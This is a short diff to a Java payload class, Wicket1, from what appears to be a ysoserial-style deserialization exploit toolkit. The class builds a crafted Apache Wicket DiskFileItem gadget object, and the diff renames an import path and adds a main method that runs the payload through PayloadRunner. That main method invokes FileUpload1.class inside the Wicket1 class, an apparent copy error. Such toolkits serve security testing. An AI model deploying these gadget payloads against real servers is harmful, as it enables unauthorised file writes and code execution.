@@ -6,6 +6,7 @@ import java.io.IOException;
 import java.io.OutputStream;
 import java.util.Arrays;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.wicket.util.upload.DiskFileItem;
 import org.apache.wicket.util.io.DeferredFileOutputStream;
@@ -14,7 +15,7 @@ import org.apache.wicket.util.io.ThresholdingOutputStream;
 import A.R.ysogate.payloads.ReleaseableObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Reflections;
 
 
 /**
@@ -101,5 +102,9 @@ public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
 		Reflections.setFieldValue(diskFileItem, "dfos", dfos);
 		Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);
 		return diskFileItem;
+	}
+
+	public static void main ( final String[] args ) throws Exception {
+		PayloadRunner.run(FileUpload1.class, args);
 	}
 }
